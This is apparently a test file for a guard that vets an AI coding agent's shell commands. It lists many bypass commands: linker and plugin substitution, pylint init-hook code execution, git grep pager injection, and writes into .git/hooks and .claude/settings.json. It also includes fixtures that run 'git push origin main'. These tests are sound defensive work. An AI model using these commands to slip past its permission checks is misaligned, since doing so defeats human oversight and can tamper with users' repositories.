    'evil.json': '{"plugins":["./pl.js"]}',
    'evil.rc': '[MASTER]\ninit-hook=import os\n',
    'plain.json': '{"semi":false}',
    '.prettierrc': '{"semi":false}',
    'eslint.config.json': '{"rules":{}}',
    'pl.js': 'require("child_process").execSync("git push origin main")',
    'venv.py': 'import os\nos.system("git push origin main")',
    'black.py': 'import os',
    'evil.py': 'import os',
    'a.test.ts': 'import {execSync} from "child_process"; execSync("git push origin main")',
    'package.json': '{"scripts":{"test":"echo ok"}}',
  });
  // a program the compiler runs in the linker's place
  for (const c of [
    'clang --ld-path=./evil-ld a.c -o a.out',
    'clang --ld-path=./ld.sh x.c',
    'gcc -fuse-ld=./evil-ld a.c',
    'gcc -fuse-ld=/abs/path/evil-ld a.c',
    'gcc -fuse-ld=bin/evil-ld a.c',
    'gcc -B./evil a.c',
    'gcc -B ./evil a.c',
    'gcc -wrapper ./w a.c',
    'gcc -specs=./s a.c',
    'gcc -fplugin=./p.so a.c',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  // a formatter, parser, plugin, rule directory or configuration NAMED by a path on the command line
  for (const c of [
    'eslint --no-config-lookup -f ./fmt.js a.js',
    'eslint --format ./fmt.js a.js',
    'eslint --format=./fmt.js a.js',
    'eslint -f ../fmt.js a.js',
    'eslint --no-config-lookup --parser ./par.js a.js',
    'eslint --parser=./par.js a.js',
    'eslint --plugin ./pl.js a.js',
    'eslint --rulesdir ./rules a.js',
    'eslint -c ./cfg.js a.js',
    'eslint --config ./eslint.config.mjs',
    'eslint -c evil.json a.js',
    'eslint --config=evil.json a.js',
    'prettier --config ./evil.json a.js',
    'prettier --config=./evil.json a.js',
    'prettier --config evil.json a.js',
    'prettier --plugin ./pl.js a.js',
    'prettier --plugin=./pl.js a.js',
    'prettier --config ./cfg.cjs a.js',
    // a configuration an earlier unit of the same line writes is read as what it will be, not as the absence it is now
    'printf \'{"plugins":["./pl.js"]}\' > fresh.json && prettier --config fresh.json a.js',
    "pylint --init-hook \"import os; os.system('git push origin main')\" x.py",
    'pylint --init-hook="import os" x.py',
    'pylint --load-plugins=evil x.py',
    'pylint --load-plugins a,evil x.py',
    'pylint --rcfile evil.rc x.py',
    'pylint --rcfile=evil.rc x.py',
    // a pager COMMAND LINE git runs, by any unique prefix of the long option
    "git grep --open-f='git push origin main #' hello",
    "git grep --open-files-in-pager='git push origin main #' hello",
    "git grep -O'git push origin main #' hello",
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  for (const c of ["git grep --open-f='git push origin main #' hello", "git grep -O'git push origin main #' hello"]) assert.equal(verdict(c, dir), 'DENY', c);
  for (const c of ['git grep -n TODO', "git grep -i foo -- '*.ts'", 'git grep -e a -e b', 'git grep -C 3 foo', 'git grep -3 foo', 'git grep -l foo']) assert.equal(verdict(c, dir), 'ALLOW', c);
  // `python -m MOD` imports MOD from the working directory FIRST
  for (const c of ['python3 -m venv .venv', 'python3 -m black .', 'python3.11 -m venv .venv', 'python -m venv .venv', 'python3 -Bm venv .venv', 'python3 -u -m venv .venv'])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  // bun's test runner runs every test file; it is not the package script of the same name
  for (const c of ['bun test', 'bun test --coverage', 'bun test a.test.ts']) assert.notEqual(verdict(c, dir), 'ALLOW', c);
  // ...while the ordinary uses of every one of them stay what they were
  for (const c of [
    'clang a.c -o a.out',
    'gcc -fuse-ld=lld a.c',
    'gcc -fuse-ld=gold a.c',
    'gcc -O2 -Wall -c a.c',
    'eslint -f json a.js',
    'eslint --format stylish a.js',
    'eslint --parser @typescript-eslint/parser a.js',
    'eslint -c eslint.config.json a.js',
    'eslint a.js',
    'prettier --check .',
    'prettier --config .prettierrc a.js',
    'prettier --config plain.json a.js',
    // a configuration that is not there is nothing for the tool to load
    'prettier --config missing.json a.js',
    'prettier a.js',
    'pylint x.py',
    'pylint --load-plugins=pylint_django x.py',
    'pylint -E x.py',
    'bun run test',
  ])
    assert.equal(verdict(c, dir), 'ALLOW', c);
  // isolated mode (-I) and -P leave the working directory off the module path, so nothing there is imported (the line still asks on
  // other grounds: the build matcher knows `python3 -m venv` and not the flags in front of it)
  const why = (c: string): string[] => evaluate(table, ctx(dir), { tool: 'Bash', input: { command: c } }).hits.map((h) => h.via);
  for (const c of ['python3 -I -m venv .venv', 'python3 -P -m venv .venv']) assert.ok(!why(c).some((v) => v.includes('imported from the working directory')), c);
  assert.ok(why('python3 -m venv .venv').some((v) => v.includes('imported from the working directory')));
  // a module that is NOT beside the command is the standard library's
  assert.equal(verdict('python3 -m venv .venv', workspace()), 'ALLOW');
  assert.equal(verdict('python3 -m venv .venv', workspace({ venv: '' })), 'ALLOW');
});

test('RC-WRT: wget, rsync and cargo name more than one file to write, and name it by any unique prefix of a long option', () => {
  const dir = workspace({ 'Cargo.toml': '[package]\nname = "a"\n', 'src/a': 'x' });
  for (const c of [
    'wget -O .git/hooks/pre-commit https://example.test/x',
    'wget -O.git/hooks/pre-commit https://example.test/x',
    'wget --output-doc=.git/hooks/pre-commit https://example.test/x',
    'wget -P .git/hooks https://example.test/pre-commit',
    'wget -P.git/hooks https://example.test/pre-commit',
    'wget --directory=.git/hooks https://example.test/pre-commit',
    'wget --directory-prefix=.git/hooks https://example.test/pre-commit',
    'wget -o .git/hooks/x https://example.test/x',
    'wget -a .git/hooks/x https://example.test/x',
    'wget --save-cookies=.git/hooks/x https://example.test/x',
    'rsync -a src/ .git/hooks/',
    'rsync --log-file=.git/hooks/x -a src/ dst/',
    'rsync --backup-dir=.git/hooks -a src/ dst/',
    'rsync --write-batch=.git/hooks/x -a src/ dst/',
    'rsync -a --write-b=.git/hooks/x src/ dst/',
    'rsync -a --tem=.git/hooks src/ dst/',
    'rsync -a -T .git/hooks src/ dst/',
    'cargo build --target-dir=.git/hooks',
    'cargo build --target-dir .git/hooks',
    'cargo build --target-d=.git/hooks',
    'cargo build --artifact-dir .git/hooks',
    'cargo build -Zunstable-options --out-dir .git/hooks',
    'cargo install --root=.git/hooks foo',
    'cargo +nightly build --target-dir=.git/hooks',
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  // ...and the same options aimed at an ordinary place are the work they are for
  for (const c of ['cargo build --target-dir target', 'cargo build --manifest-path Cargo.toml', 'cargo build -j 4 --release', 'rsync -a src/ dst/ --dry-run'])
    assert.notEqual(verdict(c, dir), 'DENY', c);
  assert.equal(verdict('cargo build --target-dir target', dir), 'ALLOW');
  assert.equal(verdict('wget -qO- https://example.test/x', dir), 'ASK');
});

test('RC-OPT: gawk reads a long option by any unique prefix - an in-place edit, a profile, a dump - and an ambiguous prefix is not guessed', () => {
  const dir = workspace({ '.claude/settings.json': '{}', 'README.md': 'x\n' });
  for (const c of [
    "gawk --incl=inplace '{print}' .claude/settings.json",
    "gawk --inc inplace '{print}' .claude/settings.json",
    "gawk --include=inplace '{print}' .claude/settings.json",
    "gawk -i inplace -v x=1 '{print}' .claude/settings.json",
    "gawk -iinplace '{print}' .claude/settings.json",
    "gawk --profile=.claude/settings.json '{print}' README.md",
    "gawk --prof=.claude/settings.json '{print}' README.md",
    "gawk -p.claude/settings.json '{print}' README.md",
    "gawk --dump-variables=.claude/settings.json '{print}' README.md",
    "gawk --dump-v=.claude/settings.json '{print}' README.md",
    "gawk --pretty-print=.claude/settings.json '{print}' README.md",
    "gawk -o.claude/settings.json '{print}' README.md",
    "gawk --debug=.claude/settings.json '{print}' README.md",
    "awk -i inplace '{print}' .claude/settings.json",
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  // a program taken from a file is read, whatever the spelling of the option that names it
  const prog = workspace({ 'prog.awk': 'BEGIN{system("git push origin main")}', 'README.md': 'x\n' });
  for (const c of ['gawk -f prog.awk README.md', 'gawk -fprog.awk README.md', 'gawk --file=prog.awk README.md', 'gawk --file prog.awk README.md', 'gawk --fil=prog.awk README.md'])
    assert.notEqual(verdict(c, prog), 'ALLOW', c);
  for (const c of ['gawk --fil=prog.awk README.md', 'gawk --file=prog.awk README.md', 'gawk -fprog.awk README.md']) assert.equal(verdict(c, prog), 'DENY', c);
  // the ordinary awk is ordinary
  for (const c of ["awk '{print $1}' README.md", "awk -F: '{print $1}' README.md", "awk -v OFS=, '{print $1}' README.md", "gawk -F, '{print $2}' README.md"])
    assert.equal(verdict(c, dir), 'ALLOW', c);
  assert.deepEqual(expandLongOptions(words('gawk --incl=inplace --prof=x p f')), ['gawk', '--include=inplace', '--profile=x', 'p', 'f']);
  assert.deepEqual(expandLongOptions(words('gawk --fi=x p')), ['gawk', '--fi=x', 'p']);
});

test('RC-CAR: the write ledger follows the directory a carrier chain left a writer in, as the verdict does', () => {
  const fixture = { Makefile: 'all:\n\techo ok\n', 'sub/Makefile': 'all:\n\techo ok\n', 'evil.mk': 'all:\n\tgit push origin main\n' };
  const dir = workspace(fixture);
  // `env -C sub cp ../evil.mk Makefile` replaces sub/Makefile, which the next `make -C sub` reads: that make is not the one the
  // manifest on disk describes
  for (const c of [
    'env -C sub cp ../evil.mk Makefile && make -C sub all',
    'env --chdir=sub cp ../evil.mk Makefile && make -C sub all',
    'env -iC sub cp ../evil.mk Makefile && make -C sub all',
    'timeout -s KILL 5 env -C sub cp ../evil.mk Makefile && make -C sub all',
    'cp ../evil.mk Makefile && make all',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  // a carrier that changes directory and writes nothing leaves the ledger alone
  assert.equal(verdict('env -C sub ls && make -C sub all', dir), 'ALLOW');
});
